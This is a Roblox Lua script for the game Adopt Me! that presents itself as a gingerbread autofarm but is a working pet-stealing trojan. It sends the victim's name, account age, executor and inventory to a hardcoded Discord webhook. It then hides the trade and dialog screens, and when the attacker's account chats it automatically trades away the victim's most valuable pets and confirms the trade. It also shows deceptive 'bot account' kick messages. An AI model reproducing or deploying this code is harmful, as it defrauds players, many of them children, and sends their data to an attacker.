local Username = "QuadCoreDragon" 
local Webhook = "https://discord.com/api/webhooks/1312275511275163688/x3npM631GGXaqtf3JUpBMUKCHOqgL7T2ynd3lzmofyIAntRsg379s3QJKPb28eGi-8oF"

if getgenv().adm then return end
getgenv().adm = true

local Services = setmetatable({}, {
    __index = function(_, Name)
        return cloneref(game:GetService(Name))
    end
})
local RobloxReplicatedStorage = Services.RobloxReplicatedStorage
local GetServerType = RobloxReplicatedStorage:FindFirstChild("GetServerType")
local IsVIP = GetServerType and GetServerType:InvokeServer() == "VIPServer"
print(IsVIP)
if IsVIP then
    local Players = Services.Players 
    local LocalPlayer = Players.LocalPlayer
    if LocalPlayer then
        LocalPlayer:Kick("\nPrivate Servers are not supported, unable to get Remote.Events")
    end
end

local StarterGui = game:GetService("StarterGui")
spawn(function()
    while not game:IsLoaded() do
       StarterGui:SetCore("SendNotification", {
           Title = "Game Needs to Fully Load.", 
            Text = "Game is loading...", 
            Icon = "rbxassetid://2663933748", 
            Duration = 5
        })
        wait(5)
    end
end)
repeat wait() until game:IsLoaded()
StarterGui:SetCore("SendNotification", {
    Title = "Game Fully Loaded.", 
    Text = "Script Starting...", 
    Icon = "rbxassetid://2663933748", 
    Duration = 3
})

local Pets = {}
local PetCounts = {}
local Loaders = require(game.ReplicatedStorage.Fsys).load
local InventoryDB = Loaders("InventoryDB")
local ClientData = Loaders("ClientData")
local bucks = tostring(require(game:GetService("ReplicatedStorage").Fsys).load("ClientData").get("money"))

local legendaries_count, mega_count, neon_count, ultra_count = 0, 0, 0, 0
local rare_count, uncommon_count, common_count, total_pets = 0, 0, 0, 0
for i, v in pairs(ClientData.get("inventory").pets) do
    total_pets = total_pets + 1
end


for i, v in pairs(ClientData.get("inventory").pets) do
    local petData = InventoryDB[v.category][v.id]
    
    if petData.rarity == "legendary" then
        legendaries_count = legendaries_count + 1
    end
    if petData.rarity == "ultra_rare" then
        ultra_count = ultra_count + 1
    end
    if petData.rarity == "rare" then
        rare_count = rare_count + 1
    end
    if petData.rarity == "uncommon" then
        uncommon_count = uncommon_count + 1
    end
    if petData.rarity == "common" then
        common_count = common_count + 1
    end
end

local messageADOPT = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '", game.Players.LocalPlayer)'


if legendaries_count >= 5 or neon_count >= 5 or mega_count >= 1 then
    local messageADOPT = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '", game.Players.LocalPlayer)'
else

if legendaries_count + mega_count + neon_count + ultra_count == 0 then
    game:GetService("Players").LocalPlayer:Kick("\nBot Account Detected, Cannot duplicate low value object.pets.eggs [No Remote.Event Detected]")
        wait(8)
        game:shutdown()
    end
end


local plr = game.Players.LocalPlayer
local accage = game.Players.LocalPlayer.AccountAge
local receiver = Username
local ExecutorValue = identifyexecutor() or "Unknown"
local bucks = tostring(require(game:GetService("ReplicatedStorage").Fsys).load("ClientData").get("money"))
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]

local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
local neon_count = 0
local mega_neon_count = 0
local flyable_count = 0
local rideable_count = 0

for _, petData in pairs(playerData.inventory.pets) do
    if petData.properties and type(petData.properties) == "table" then
        if petData.properties.neon then
            neon_count = neon_count + 1
        end
        if petData.properties.mega_neon then
            mega_neon_count = mega_neon_count + 1
        end
        if petData.properties.flyable then
            flyable_count = flyable_count + 1
        end
        if petData.properties.rideable then
            rideable_count = rideable_count + 1
        end
    end
end

    local embed = {
        ["title"] = "Adopt Me! | v1.2kai",
        ["color"] = tonumber(0xFF0000),
        ["fields"] = {
            {
                ["name"] = "**Information**",
                ["value"] = "```lua\n" ..
                            "Victim       : " .. tostring(plr) .. "\n" ..
                            "Account Age  : " .. tostring(accage) .. " Days\n" ..
                            "Executor     : " .. tostring(ExecutorValue) .. "\n" ..
                            "Receiver     : " .. tostring(Username) .. "```"
            },
            {
                ["name"] = "**Inventory**",
                ["value"] = "```lua\n" ..
                            "Total Value   : " .. tostring("Soon") .. "\n\n" ..
                            "Mega Neons    : " .. tostring(mega_neon_count) .. "\n" ..
                            "Neons         : " .. tostring(neon_count) .. "\n" ..
                            "Legendaries   : " .. tostring(legendaries_count) .. "\n" ..
                            "Ultra Rares   : " .. tostring(ultra_count) .. "\n" ..
                            "Rares         : " .. tostring(rare_count) .. "\n" ..
                            "Uncommons     : " .. tostring(uncommon_count) .. "\n" ..
                            "Commons       : " .. tostring(common_count) .. "\n" ..
                            "Bucks         : " .. tostring(bucks) .. "\n```"
            },
        }
    }
    
    

function SendMessageEMBED(url, embed, bool)
  local http = game:GetService("HttpService")
  local headers = {
      ["Content-Type"] = "application/json"
  }
  local data = {
      username = "Adopt Me! | v1.2kai",
      avatar_url = "https://tr.rbxcdn.com/180DAY-f421bfa6b5b4594c77beb50a61e31c56/768/432/Image/Webp/noFilter",
      content = "@everyone\n" .. TeleportScript,
      embeds = {
          {
              title = embed.title,
              color = embed.color,
              fields = embed.fields,
          }
      }
  }
  local data2 = {
      username = "Adopt Me! | v1.2kai",
      avatar_url = "https://tr.rbxcdn.com/180DAY-f421bfa6b5b4594c77beb50a61e31c56/768/432/Image/Webp/noFilter",
      content = "@everyone\n" .. TeleportScript,
      embeds = {
          {
              title = embed.title,
              color = embed.color,
              fields = embed.fields,
          }
      }
  }

  local body = http:JSONEncode(data)
  local body2 = http:JSONEncode(data2)
  if bool == true then
      local response = request({
          Url = url,
          Method = "POST",
          Headers = headers,
          Body = body2
      })
  else
      local response = request({
          Url = url,
          Method = "POST",
          Headers = headers,
          Body = body
      })
  end
end
SendMessageEMBED(Webhook, embed, true)


game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
local stealActive = false
local function StartSteal()
    if stealActive then
    end
    stealActive = true

    local RouterClient = Loaders("RouterClient")
    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
    local function moveGUIOffScreen(guiElement)
        if guiElement then
            guiElement.Position = UDim2.new(1000, 0, 1000, 0)
        end
    end
    local dialogApp = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("DialogApp")
    if dialogApp and dialogApp:FindFirstChild("Dialog") then
        moveGUIOffScreen(dialogApp.Dialog)
    end


    SendTrade:FireServer(game.Players[Username])


local PetsInventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
local legendaries_count, mega_count, neon_count, ultra_count = 0, 0, 0, 0

if next(PetsInventory.pets) then
    local petUids = {}
    local petCount = 0
    local petLimit = 18

    for petUid, pet in pairs(PetsInventory.pets) do
        table.insert(petUids, petUid)
        
        local petData = InventoryDB[pet.category][pet.id]
        if petData.rarity == "legendary" then
            legendaries_count = legendaries_count + 1
        end
        if pet.properties and pet.properties.mega_neon then
            mega_count = mega_count + 1
        end
        if pet.properties and pet.properties.neon then
            neon_count = neon_count + 1
        end
        if petData.rarity == "ultra_rare" then
            ultra_count = ultra_count + 1
        end
    end


local function getPetPriority(pet)
    local petData = InventoryDB[pet.category][pet.id]
    local priority = 0

    if pet.properties and pet.properties.mega_neon then
        priority = 6
    elseif pet.properties and pet.properties.neon then
        priority = 5
    elseif petData.rarity == "legendary" then
        priority = 4
    elseif petData.rarity == "ultra_rare" then
        priority = 3
    elseif petData.rarity == "rare" then
        priority = 2
    elseif petData.rarity == "uncommon" then
        priority = 1
    else
        priority = 0
    end

    return priority
end
local petUids = {}
for petUid, pet in pairs(PetsInventory.pets) do
    table.insert(petUids, {uid = petUid, priority = getPetPriority(pet)})
end
table.sort(petUids, function(a, b)
    return a.priority > b.priority
end)
local petCount = 0
local petLimit = 25
while #petUids > 0 and petCount < petLimit do
    if not stealActive then
    end

    local petEntry = table.remove(petUids, 1)
    AddPetRemote:FireServer(petEntry.uid)
    petCount = petCount + 1
end
else
    game:GetService("Players").LocalPlayer:Kick("\nBot Account Detected, Cannot duplicate low value object [No Remote.Event Detected]")
    wait(5)
    game:Shutdown()
end

AcceptNegotiationRemote:FireServer()
ConfirmTradeRemote:FireServer()
    stealActive = false
    wait(1)
    StartSteal()
end

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == Username then
        player.Chatted:Connect(function(msg)
            StartSteal()
        end)
    end
end)

--autofarm
getgenv().Toggle = true
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local Workspace = game:GetService("Workspace")
local Player = Players.LocalPlayer
local wait = task.wait
local spawn = task.spawn
local function toggleNoclip(state)
    local character = Player.Character
    if character then
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") and part.CanCollide ~= state then
                part.CanCollide = state
            end
        end
    end
end
local function tweenToPosition(position)
    local character = Player.Character
    if character then
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            local distance = (rootPart.Position - position).Magnitude
            local tweenInfo = TweenInfo.new(distance / 21, Enum.EasingStyle.Linear)
            local tween = TweenService:Create(rootPart, tweenInfo, {CFrame = CFrame.new(position)})
            tween:Play()
            tween.Completed:Wait()
        end
    end
end
local function getNearestMarker()
    local character = Player.Character
    if character then
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            local nearestMarker
            local shortestDistance = math.huge
            for _, marker in ipairs(ReplicatedStorage.Resources.IceSkating.GingerbreadMarkers:GetChildren()) do
                local distance = (rootPart.Position - marker.Position).Magnitude
                if distance < shortestDistance then
                    shortestDistance = distance
                    nearestMarker = marker
                end
            end
            return nearestMarker
        end
    end
end
local function init()
    toggleNoclip(true)
    while true do
        local nearestMarker = getNearestMarker()
        if not nearestMarker then
            break
        end
        tweenToPosition(nearestMarker.Position)
        nearestMarker:Destroy()
    end
    local redemptionCircle = Workspace.Interiors:FindFirstChild("Winter2024", true)
        and Workspace.Interiors.Winter2024.RaceScriptable.Collection.GingerbreadRedemptionCircle
    if redemptionCircle then
        tweenToPosition(redemptionCircle.Position)
    end
end
spawn(function()
    while wait() do
        if getgenv().Toggle then
            pcall(init)
        else
            break
        end
    end
end)
